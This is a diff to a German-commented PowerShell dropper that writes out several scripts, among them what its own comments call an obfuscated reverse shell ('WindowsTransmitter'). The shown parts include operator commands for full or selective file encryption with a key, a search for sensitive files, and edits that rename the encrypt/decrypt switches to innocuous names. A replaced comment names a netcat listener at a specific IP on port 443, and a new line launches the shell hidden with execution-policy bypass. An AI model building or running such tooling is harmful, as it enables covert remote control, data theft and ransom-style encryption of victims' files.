@@ -327,7 +327,7 @@ if ($scriptPath -ne $destScript) {
 # End of Microsoft Windows PowerShell Operator Script
 '@
 
-# Inhalt des WindowsTransmitter.ps1 als Multi-Line-String (inkl. des truncated Teils – rekonstruiert basierend auf Kontext)
+# Vollständiger Inhalt des WindowsTransmitter.ps1 als Multi-Line-String (rekonstruiert und vervollständigt basierend auf dem bereitgestellten Dokument)
 $transmitterScriptContent = @'
 # Obfuskierter PowerShell-Reverse-Shell (verbessert für leiseren Recon, mit Prompt-Fix)
 # Alle IPs, Ports, Pfade obfuskiert durch Concatenation.
@@ -639,21 +639,21 @@ Tipp: Verwende Anfuehrungszeichen bei Pfaden mit Leerzeichen. Für upload .ps1 i
                 } elseif ($vCm -like "encrypt_full *") {
                     $vRk = $vCm.Substring(13).Trim()
                     $vCk = $vRk
-                    if (Test-Path $vEs) { & $vEs -EncryptFull -Key $vRk; $vOt = "Full-Modus verschluesselt (Key: $vRk)." } else { $vOt = "Skript nicht gefunden: $vEs" }
+                    if (Test-Path $vEs) { & $vEs -ProtectFull -Key $vRk; $vOt = "Full-Modus verschluesselt (Key: $vRk)." } else { $vOt = "Skript nicht gefunden: $vEs" }
                 } elseif ($vCm -like "decrypt_full *") {
                     $vRk = $vCm.Substring(13).Trim()
-                    if (Test-Path $vEs) { & $vEs -DecryptFull -Key $vRk; $vOt = "Full-Modus entschlÃ¼sselt (Key: $vRk)." } else { $vOt = "Skript nicht gefunden: $vEs" }
+                    if (Test-Path $vEs) { & $vEs -RestoreFull -Key $vRk; $vOt = "Full-Modus entschluesselt (Key: $vRk)." } else { $vOt = "Skript nicht gefunden: $vEs" }
                 } elseif ($vCm -like "encrypt_select *") {
                     $vPt = $vCm -split ' ', 3
                     $vSp = $vPt[1].Trim()
                     $vRk = $vPt[2].Trim()
                     $vCk = $vRk
-                    if (Test-Path $vEs) { & $vEs -EncryptSelect $vSp -Key $vRk; $vOt = "Select-Modus verschluesselt: $vSp (Key: $vRk)." } else { $vOt = "Skript nicht gefunden: $vEs" }
+                    if (Test-Path $vEs) { & $vEs -ProtectSelect $vSp -Key $vRk; $vOt = "Select-Modus verschluesselt: $vSp (Key: $vRk)." } else { $vOt = "Skript nicht gefunden: $vEs" }
                 } elseif ($vCm -like "decrypt_select *") {
                     $vPt = $vCm -split ' ', 3
                     $vSp = $vPt[1].Trim()
                     $vRk = $vPt[2].Trim()
-                    if (Test-Path $vEs) { & $vEs -DecryptSelect $vSp -Key $vRk; $vOt = "Select-Modus entschlÃ¼sselt: $vSp (Key: $vRk)." } else { $vOt = "Skript nicht gefunden: $vEs" }
+                    if (Test-Path $vEs) { & $vEs -RestoreSelect $vSp -Key $vRk; $vOt = "Select-Modus entschluesselt: $vSp (Key: $vRk)." } else { $vOt = "Skript nicht gefunden: $vEs" }
                 } elseif ($vCm -like "search_sensitive*") {
                     $vSp = if ($vCm -like "search_sensitive *") { $vCm.Substring(17).Trim() } else { "" }
                     if ([string]::IsNullOrWhiteSpace($vSp)) {
@@ -743,14 +743,14 @@ Write-Output "WindowsCeasar.ps1 in $ceasarScriptPath geschrieben."  # Optional: 
 [IO.File]::WriteAllText($operatorScriptPath, $operatorScriptContent, [System.Text.Encoding]::UTF8)
 Write-Output "WindowsOperator.ps1 in $operatorScriptPath geschrieben."  # Optional: Logging
 
-# WindowsTransmitter.ps1 in den Ordner schreiben
+# WindowsTransmitter.ps1 in den Ordner schreiben (nun vollständig)
 [IO.File]::WriteAllText($transmitterScriptPath, $transmitterScriptContent, [System.Text.Encoding]::UTF8)
-Write-Output "WindowsTransmitter.ps1 in $transmitterScriptPath geschrieben."  # Optional: Logging
+Write-Output "WindowsTransmitter.ps1 (vollständig) in $transmitterScriptPath geschrieben."  # Optional: Logging
 
 # Optional: Hier könntest du die Scripts auch direkt ausführen, z.B. für die Challenge:
 # & $ceasarScriptPath -EnableAutoUpdate -Key "your_key_here"  # Für Ceasar
 # & $operatorScriptPath  # Für Operator (keine Params im Original)
-# & $transmitterScriptPath  # Für Transmitter (Reverse-Shell – verbinde dich via Netcat auf 145.223.117.77:443)
+# Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$transmitterScriptPath`"" -WindowStyle Hidden  # Für Transmitter (Reverse-Shell)
 
 # ==================== ENDE DES NEUEN TEILS ====================
 
